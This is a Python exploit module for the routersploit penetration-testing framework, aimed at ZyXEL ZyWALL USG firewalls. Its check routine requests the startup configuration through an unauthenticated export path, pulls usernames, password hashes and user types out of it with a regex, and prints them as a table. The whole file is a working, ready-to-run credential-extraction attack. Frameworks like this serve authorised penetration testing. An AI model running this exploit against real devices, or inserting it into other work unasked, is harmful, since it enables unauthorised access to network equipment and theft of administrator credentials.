import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Zyxel ZyWALL USG Extract Hashes",
        "description": "Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export. "
                       "If the tharget is vulnerable it allows to download configuration files which contains "
                       "sensitive data like password hashes, firewall rules and other network related configurations.",
        "authors": (
            "RedTeam Pentesting",  # vulnerability discovery
        ),
        "references": (
            "https://www.exploit-db.com/exploits/17244/",
        ),
        "devices": (
            "ZyXEL ZyWALL USG-20",
            "ZyXEL ZyWALL USG-20W",
            "ZyXEL ZyWALL USG-50",
            "ZyXEL ZyWALL USG-100",
            "ZyXEL ZyWALL USG-200",
            "ZyXEL ZyWALL USG-300",
            "ZyXEL ZyWALL USG-1000",
            "ZyXEL ZyWALL USG-1050",
            "ZyXEL ZyWALL USG-2000",
        ),
    }
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")

    def __init__(self):
        self.credentials = []

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target appears to be vulnerable")
            print_table(("Username", "Hash", "User type"), *self.credentials)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):  # todo: requires improvement
        path = "/cgi-bin/export-cgi/images/?category={}&arg0={}".format('config', 'startup-config.conf')
        response = self.http_request(
            method="GET",
            path=path
        )

        if response is not None and response.status_code == 200:
            for line in response.text.split("\n"):
                line = line.strip()
                m_groups = re.match(r"username (.*) password (.*) user-type (.*)", line, re.I | re.M)
                if m_groups:
                    self.credentials.append((m_groups.group(1), m_groups.group(2), m_groups.group(3)))

            if self.credentials:
                return True  # target is vulnerable

        return False  # target is not vulnerable
